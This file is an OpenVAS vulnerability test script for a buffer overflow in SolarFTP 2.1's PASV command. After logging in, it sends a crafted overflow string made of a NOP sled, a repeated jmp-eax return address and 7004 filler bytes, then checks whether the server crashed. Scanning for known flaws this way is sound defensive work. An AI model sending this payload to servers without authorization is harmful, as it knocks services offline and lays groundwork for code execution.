###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_solarftp_45748.nasl 12014 2018-10-22 10:01:47Z mmartin $
#
# SolarFTP 'PASV' Command Remote Buffer Overflow Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103024");
  script_version("$Revision: 12014 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-22 12:01:47 +0200 (Mon, 22 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-01-11 12:59:27 +0100 (Tue, 11 Jan 2011)");
  script_bugtraq_id(45748);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("SolarFTP 'PASV' Command Remote Buffer Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_family("FTP");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "secpod_ftp_anonymous.nasl", "ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/45748");
  script_xref(name:"URL", value:"http://www.solarftp.com/");

  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary code within
 the context of the affected application. Failed exploit attempts will
 result in a denial-of-service condition.");
  script_tag(name:"affected", value:"SolarFTP 2.1 is vulnerable. Other versions may also be affected.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"SolarFTP is prone to a buffer-overflow vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port){
  port = 21;
}

if(get_kb_item('ftp/'+port+'/broken'))exit(0);

if(!get_port_state(port)){
  exit(0);
}

banner = get_ftp_banner(port:port);
if("Solar FTP Server" >!< banner)exit(0);

soc1 = open_sock_tcp(port);
if(!soc1){
  exit(0);
}

domain = get_kb_item("Settings/third_party_domain");
if(isnull(domain)) {
 domain = this_host_name();;
}

user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

if(!user)user = "anonymous";
if(!pass)pass = string("openvas@", domain);

login_details = ftp_log_in(socket:soc1, user:user, pass:pass);

if(login_details)
{
 jmp_eax  = crap(data:raw_string(0xBF,0x66,0x02,0x10),length:4*249);
 junk     = raw_string(0xCC,0xCC,0xCC,0xCC);
 nop_sled = crap(data:raw_string(0x90,0x90,0x90,0x90,0x90,0x90,0x90),length:2*7);
 junk2    = crap(data:"A",length:7004);
 bad_stuff = junk + nop_sled + jmp_eax + junk2;

 send(socket:soc1,data:string("PASV ", bad_stuff,"\r\n"));
 ftp_close(socket:soc1);
 close(soc1);

 sleep(2);

 soc = open_sock_tcp(port);
 if(!soc || !ftp_recv_line(socket:soc)) {
   security_message(port:port);
   exit(0);
 }
 close(soc);
 exit(0);
}

exit(0);
